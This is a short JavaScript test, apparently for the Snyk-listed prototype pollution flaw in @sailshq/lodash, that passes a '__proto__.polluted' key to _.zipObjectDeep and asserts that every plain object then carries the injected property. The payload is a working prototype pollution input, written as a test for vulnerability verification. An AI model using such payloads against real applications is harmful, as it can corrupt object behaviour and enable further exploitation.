//https://security.snyk.io/vuln/SNYK-JS-SAILSHQLODASH-567754
test("prototype pollution in@sailshq/lodash", () => {
  expect({}.polluted).toBe(undefined);
  const _ = require("lodash");
  _.zipObjectDeep(["__proto__.polluted"], ["yes"]);
  console.log(polluted);
  expect({}.polluted).toBe("yes");
});
``;
